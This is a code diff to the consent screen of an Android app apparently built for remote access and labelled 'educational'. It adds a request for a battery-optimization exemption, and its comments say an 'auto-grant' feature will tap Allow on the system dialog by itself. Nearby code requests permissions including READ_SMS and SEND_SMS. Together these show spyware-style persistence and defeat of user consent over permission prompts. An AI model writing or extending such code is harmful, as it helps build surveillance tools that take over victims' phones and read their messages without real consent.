@@ -1,10 +1,14 @@
 package com.remoteaccess.educational;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.PowerManager;
+import android.provider.Settings;
 import android.widget.Button;
 import android.widget.CheckBox;
 import androidx.appcompat.app.AppCompatActivity;
@@ -100,8 +104,12 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void requestNecessaryPermissions() {
+        // Request battery optimization exemption first — auto-grant will click Allow on the dialog
+        requestBatteryOptimization();
+
         List<String> permissionsToRequest = new ArrayList<>();
 
+        // Note: POST_NOTIFICATIONS intentionally excluded — it is not requested when accessibility is enabled
         String[] permissions = {
             Manifest.permission.READ_SMS,
             Manifest.permission.SEND_SMS,
@@ -128,6 +136,20 @@ public class ConsentActivity extends AppCompatActivity {
             );
         } else {
             grantConsent();
+        }
+    }
+
+    /** Opens the battery optimization exemption dialog so auto-grant can click Allow. */
+    private void requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                        Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                }
+            } catch (Exception ignored) {}
         }
     }
 
